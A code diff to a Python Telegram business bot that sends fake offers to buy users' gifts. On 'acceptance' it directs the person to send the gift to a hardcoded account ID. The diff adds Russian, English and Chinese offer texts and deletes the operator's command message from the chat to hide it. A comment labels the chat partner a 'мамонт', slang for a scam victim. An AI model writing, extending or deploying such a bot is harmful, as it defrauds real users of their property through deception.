@@ -25,6 +25,39 @@ PROFIT_TOPIC_ID = 3
 CURRENCY = {"g": "💎", "s": "⭐"}
 TARGET_USERNAME = "rattiixx"
 
+TEXTS = {
+    "ru": {
+        "offer_text": "Пользователь <b>{who}</b> предлагает Вам {sum} {cur} за подарок <b>{name}</b>.",
+        "accepted": "🎁 <b>Подарок:</b> {name}\n\n<b>Предложение принято!</b>\n\nОжидается передача подарка.\n\nСумма предложения: {sum} {cur}",
+        "btn_give": "🎁 Передать подарок",
+        "btn_how": "❓ Как передать?",
+        "btn_decline": "❌ Отклонить",
+        "btn_accept": "✅ Принять",
+        "alert_how": "Нажмите на кнопку ниже, чтобы открыть интерфейс подарка.\n\nЗатем выберите подарок и отправьте его получателю.",
+        "declined": "Вы отклонили предложение."
+    },
+    "en": {
+        "offer_text": "User <b>{who}</b> offers You {sum} {cur} for the gift <b>{name}</b>.",
+        "accepted": "🎁 <b>Gift:</b> {name}\n\n<b>Offer accepted!</b>\n\nWaiting for gift transfer.\n\nOffer amount: {sum} {cur}",
+        "btn_give": "🎁 Give gift",
+        "btn_how": "❓ How to give?",
+        "btn_decline": "❌ Decline",
+        "btn_accept": "✅ Accept",
+        "alert_how": "Click the button below to open the gift interface.\n\nThen choose a gift and send it to the recipient.",
+        "declined": "You have declined the offer."
+    },
+    "cn": {
+        "offer_text": "用户 <b>{who}</b> 向您提供 {sum} {cur} 以换取礼物 <b>{name}</b>。",
+        "accepted": "🎁 <b>礼物：</b> {name}\n\n<b>已接受！</b>\n\n等待礼物转移。\n\n出价金额：{sum} {cur}",
+        "btn_give": "🎁 赠送礼物",
+        "btn_how": "❓ 如何赠送？",
+        "btn_decline": "❌ 拒绝",
+        "btn_accept": "✅ 接受",
+        "alert_how": "点击下方按钮打开礼物界面。\n\n然后选择一个礼物并发送给接收者。",
+        "declined": "您已拒绝该提议。"
+    }
+}
+
 ALLOWED = [
     "message", "callback_query", "business_connection",
     "business_message", "edited_business_message", "deleted_business_messages"
@@ -36,6 +69,12 @@ dp = Dispatcher()
 OFFERS: dict[str, dict] = {}
 CONN: dict[int, str] = {}
 session: aiohttp.ClientSession | None = None
+
+LARGE_PREVIEW = LinkPreviewOptions(
+    is_disabled=False,
+    prefer_large_media=True,
+    show_above_text=True
+)
 
 # ---------- Трекер ----------
 async def tracker_log(text: str):
@@ -62,9 +101,7 @@ async def bs_send(chat_id: int, text: str, markup=None, bc_id: str | None = None
                 chat_id=chat_id, text=text,
                 reply_markup=markup,
                 business_connection_id=bc_id,
-                link_preview_options=LinkPreviewOptions(
-                    is_disabled=False, prefer_large_media=True, show_above_text=True
-                )
+                link_preview_options=LARGE_PREVIEW
             )
         except TelegramRetryAfter as e:
             await asyncio.sleep(e.retry_after)
@@ -81,9 +118,7 @@ async def bs_edit(bc_id: str, chat_id: int, message_id: int, text: str, markup=N
         return await bot.edit_message_text(
             business_connection_id=bc_id, chat_id=chat_id, message_id=message_id,
             text=text, reply_markup=markup,
-            link_preview_options=LinkPreviewOptions(
-                is_disabled=False, prefer_large_media=True, show_above_text=True
-            )
+            link_preview_options=LARGE_PREVIEW
         )
     except Exception as e:
         logging.error(f"bs_edit error: {e}")
@@ -104,12 +139,16 @@ async def cmd_offer(msg: Message):
     parts = msg.text.split()
     
     if len(parts) < 4:
-        await bs_send(msg.chat.id, "Формат: <code>/offer [ссылка] [сумма] [валюта]</code>", bc_id=msg.business_connection_id)
+        await bs_send(msg.chat.id, "Формат: <code>/offer [ссылка] [сумма] [валюта] [язык]</code>", bc_id=msg.business_connection_id)
         return
         
     url = parts[1]
     amount = parts[2]
     cur = parts[3]
+    lang = parts[4].lower() if len(parts) > 4 else "ru"
+    
+    if lang not in TEXTS:
+        lang = "ru"
 
     if not url.startswith("http"):
         url = "https://" + url
@@ -117,6 +156,15 @@ async def cmd_offer(msg: Message):
     if cur not in CURRENCY:
         await bs_send(msg.chat.id, "Валюта: <code>g</code> (💎) или <code>s</code> (⭐)", bc_id=msg.business_connection_id)
         return
+
+    # УДАЛЯЕМ КОМАНДУ ИЗ ЧАТА
+    try:
+        await bot.delete_business_messages(
+            business_connection_id=msg.business_connection_id,
+            message_ids=[msg.message_id]
+        )
+    except Exception as e:
+        logging.error(f"Delete error: {e}")
 
     oid = uuid.uuid4().hex[:10]
     OFFERS[oid] = {
@@ -126,16 +174,17 @@ async def cmd_offer(msg: Message):
         "msg": msg.message_id, "bc": msg.business_connection_id, "state": "new"
     }
     
+    t = TEXTS[lang]
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Принять", callback_data=f"acc:{oid}"),
-         InlineKeyboardButton(text="❌ Отклонить", callback_data=f"dec:{oid}")]
+        [InlineKeyboardButton(text=t["btn_accept"], callback_data=f"acc:{oid}"),
+         InlineKeyboardButton(text=t["btn_decline"], callback_data=f"dec:{oid}")]
     ])
     
     who = msg.from_user.full_name
     
     sent = await bs_send(
         msg.chat.id,
-        f"Пользователь <b>{who}</b> предлагает Вам {amount} {CURRENCY[cur]} за подарок.\n\n{url}",
+        t["offer_text"].format(who=who, sum=amount, cur=CURRENCY[cur], name=OFFERS[oid]["name"]) + f"\n\n{url}",
         markup=kb, bc_id=msg.business_connection_id
     )
     
@@ -158,12 +207,15 @@ async def on_btn(cb: CallbackQuery):
     if not o:
         return
 
+    lang = "ru" 
+    t = TEXTS[lang]
+
     if action == "dec":
         if o["state"] == "accepted":
             return
         o["state"] = "declined"
         await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id,
-                      f"❌ Предложение отклонено.\n\n{o['amount']} {o['cur']} — «{o['name']}»")
+                      t["declined"])
         await tracker_log(f"❌ decline {oid}")
         return
 
@@ -172,13 +224,11 @@ async def on_btn(cb: CallbackQuery):
             return
         o["state"] = "accepted"
         
-        text = (f"🎁 <b>Подарок:</b> {o['name']}\n\n<b>Предложение принято!</b>\n\n"
-                f"Ожидается передача подарка.\n\nСумма: {o['amount']} {o['cur']}")
+        text = t["accepted"].format(name=o['name'], sum=o['amount'], cur=o['cur'])
         
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            # ТВОЯ ССЫЛКА ВОЗВРАЩЕНА
-            [InlineKeyboardButton(text="🎁 Передать подарок", url="tg://send_gift?to=8863549439")],
-            [InlineKeyboardButton(text="❓ Как передать?", callback_data=f"how:{oid}")]
+            [InlineKeyboardButton(text=t["btn_give"], url="tg://send_gift?to=8863549439")],
+            [InlineKeyboardButton(text=t["btn_how"], callback_data=f"how:{oid}")]
         ])
         
         # Редактируем сообщение ТОЛЬКО в чате с мамонтом
@@ -188,10 +238,7 @@ async def on_btn(cb: CallbackQuery):
         return
 
     if action == "how":
-        await cb.answer(
-            "Нажмите «Передать подарок» — откроется интерфейс отправки. Выберите подарок и получателя.",
-            show_alert=True
-        )
+        await cb.answer(t["alert_how"], show_alert=True)
         return
 
     if action == "give":
